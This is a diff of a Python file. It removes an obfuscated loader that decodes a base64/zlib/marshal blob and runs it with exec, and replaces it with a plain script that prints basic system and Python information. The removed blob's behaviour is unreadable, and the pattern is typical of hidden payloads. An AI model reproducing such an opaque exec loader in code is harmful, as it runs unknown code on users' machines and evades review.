@@ -1,3 +1,21 @@
-# ENCRYPTED BY: RAMIZ UDDIN ULTIMATE OBFUSCATOR
-# SOURCE PROTECTED. DO NOT TAMPER.
-import marshal,zlib,base64;exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyVUs9rE0EUfrM7m6xJ1KKtQWvrGjy4gtKQVmislWoihGAOu1ZqU1liMqSRbDbMbpTuRdGDOXioiKgH/wD9SzxWkiIMvXkQb6X5B7qzaX5ocumDfTPvzcz73n7f+w1DJhytnZTnPoIOOsoC7a6IIl24AFToZ0UvEjewjpNrAAUZYEOMwcJRCQXKqIxU6S8PckU0hCJ5n8hRvvso+f6BJsCIxTy0BdSrmZd6eV0YmxVXQQuOVul1dQoS49/hsVlpkC2DGsgxqVglBerOT+fjtxI3zdvHMTeg+ObOdNd7WnrlYTql3H2cVLSVB5l1ZTWVyuTc+LGqTufnTBUzwbJZwN6yHWIyqU4rNYdJjXqdUBUxXCuYxOZ/ojBgYceyqsYmKZQIpWEvib3PXvbcK9jDgbeZ15lmuY3P7eETO6FLbax4m+b97flPyffJD0vbN3ZCl9s45p+qbXzN31zcxTMdzlNxmHSxp/O7rs79GRgoqgv+7Exy5XTIIgs0CUZsaKYgH+hlNXn0ZuxfJQeI/yvpBvRN68UdhQmLi5SPnSs3OE3K9YIbzKdrDqFPVIlJlVq94bBQcespoUaJ1G0WpsS0nhM/oLxZyjtSEZ3gPPos05DnmUgbNXrG253kB3NdgoOR5tqbl5+vtIKzLSX+K5H5mci0E9kfj3rUP2vj85xxdRdP0givIxuGWajUDEOVfDyGnYpJfOn88vwCb90wvoH/ogsvL5lWqVElyzTqhbwv+6rn9kWE0B84fYAlNNuZABQ6EEQ0tS8DjjTXW2L0y9mvUzti1K90CIeZwq8='))))
+#!/usr/bin/env python3
+"""Show basic local system and Python information without changing the device."""
+import os
+import platform
+import sys
+from pathlib import Path
+
+
+def main():
+    print("Local System Information")
+    print(f"Operating system: {platform.system()} {platform.release()}")
+    print(f"Machine:          {platform.machine() or 'unknown'}")
+    print(f"Python:           {platform.python_version()}")
+    print(f"Executable:       {sys.executable}")
+    print(f"Working folder:   {Path.cwd()}")
+    print(f"Process ID:       {os.getpid()}")
+    print(f"CPU count:        {os.cpu_count() or 'unknown'}")
+
+
+if __name__ == "__main__":
+    main()
